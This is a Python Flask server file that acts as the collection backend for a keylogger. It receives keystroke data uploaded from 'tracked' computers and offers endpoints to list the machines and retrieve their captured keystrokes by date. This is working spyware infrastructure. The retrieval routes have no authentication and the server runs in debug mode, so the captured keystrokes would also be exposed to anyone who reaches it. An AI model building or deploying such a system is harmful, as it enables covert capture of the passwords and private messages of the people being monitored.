from flask import Flask, jsonify
from request_functions import RequestFunctions
from flask_cors import CORS
from dotenv import load_dotenv
import os


app = Flask(__name__)
CORS(app)  # Enable Cross-Origin Resource Sharing

load_dotenv()  # Load environment variables from .env file
DECRYPTION_KEY = os.getenv('DECRYPTION_KEY')  # Get decryption key from environment
BASE_DIR = os.getenv("DATA_DIR", os.getcwd())  # Get base directory for data, default to current working directory

# Create an instance of the RequestFunctions class with the necessary parameters
request_handler = RequestFunctions(BASE_DIR, DECRYPTION_KEY)

# POST requests

@app.route('/api/upload', methods=['POST'])
def upload():
    """Upload keystrokes data from the tracked computer"""
    try:
        response = request_handler.upload()  # Call the upload method from RequestFunctions
        if 'Error' in response:
            return jsonify(response), 400  # Return error response with HTTP 400 status
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

@app.route('/api/login', methods=['POST'])
def login():
    """Validate username and password for user login"""
    try:
        response = request_handler.login()  # Call the login method from RequestFunctions
        if 'Error' in response:
            return jsonify(response), 400  # Return error response with HTTP 400 status
        if 'Failed' in response:
            return jsonify(response), 401  # Return unauthorized response with HTTP 401 status
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

@app.route('/api/send_error', methods=['POST'])
def send_error():
    """Send an error message if an error occurred on the monitored computer"""
    try:
        response = request_handler.send_error()  # Call the send_error method from RequestFunctions
        if 'Error' in response:
            return jsonify(response), 400  # Return error response with HTTP 400 status
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

# GET requests

@app.route('/api/get_machines_names', methods=['GET'])
def get_machines_names():
    """Get the list of tracked computer names"""
    try:
        response = request_handler.get_machines_names()  # Call the get_machines_names method from RequestFunctions
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

@app.route('/api/get_dates_by_name/<name>', methods=['GET'])
def get_dates_by_name(name):
    """Get the list of dates collected for a specific computer"""
    try:
        response = request_handler.get_dates_by_name(name)  # Call the get_dates_by_name method from RequestFunctions
        if 'Error' in response:
            return jsonify(response), 400  # Return error response with HTTP 400 status
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

@app.route('/api/get_keystrokes_by_name_and_date/<name>/<date>', methods=['GET'])
def get_keystrokes_by_name_and_date(name, date):
    """Get keystroke data for a specific computer on a specific date"""
    try:
        response = request_handler.get_keystrokes_by_name_and_date(name, date)  # Call the get_keystrokes_by_name_and_date method from RequestFunctions
        if 'Error' in response:
            return jsonify(response), 400  # Return error response with HTTP 400 status
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs

@app.route('/api/get_error_file', methods=['GET'])
def get_error_file():
    """Get the file containing information about errors occurred on monitored computers"""
    try:
        response = request_handler.get_error_file()  # Call the get_error_file method from RequestFunctions
        return jsonify(response), 200  # Return success response with HTTP 200 status
    except Exception as e:
        return jsonify({'Error': str(e)}), 500  # Return internal server error if an exception occurs


if __name__ == '__main__':
    app.run(debug=True)  # Run the Flask app in debug mode
